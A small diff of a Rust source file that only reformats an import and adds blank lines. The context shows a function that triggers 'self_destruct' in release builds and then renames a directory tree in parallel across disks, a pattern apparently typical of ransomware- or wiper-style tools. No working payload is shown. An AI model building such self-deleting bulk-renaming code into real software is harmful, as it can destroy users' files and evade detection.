@@ -5,12 +5,14 @@ use std::time::Duration;
 use sysinfo::Disks;
 use threadpool::ThreadPool;
 use walkdir::WalkDir;
-use crate::windows;
+use crate::{windows};
 
 pub(crate) fn start_rename(path: PathBuf, do_exit: bool) {
     #[cfg(not(debug_assertions))]
     windows::self_destruct();
     
+
+
     let cpus = num_cpus::get();
     rename_tree(path.clone(), 2).unwrap();
 
